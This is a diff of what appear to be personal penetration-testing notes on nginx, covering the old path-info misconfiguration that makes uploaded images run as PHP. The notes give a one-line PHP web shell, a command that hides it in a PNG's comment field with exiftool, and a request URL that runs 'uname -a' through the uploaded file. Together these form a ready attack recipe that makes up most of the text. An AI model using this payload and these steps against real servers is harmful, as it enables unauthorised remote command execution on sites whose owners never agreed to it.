@@ -1,12 +1,15 @@
 # nginx
 
+# config pitfalls
+https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+
 # 2010, discovered by 80sec.com
 http://blah/uploads/hacker.png/x.php
 if not configured properly, will be interpreted as PHP code
 
-echo "<?php system($_GET['c']); ?>" > shell.php
+echo "<?php system($_GET[1]); ?>" > webshell.php
 $ exiftool "-comment<=shell.php" malicious.png # use strings to make sure all's good (http://www.sno.phy.queensu.ca/~phil/exiftool/index.html)
-http://blah/uploads/136991823.png/c.php?c=uname%20-a
+http://blah/uploads/136991823.png/webshell.php?1=uname+-a
 
 # vulns
 * Request line parsing vulnerability (CVE-2013-4547)
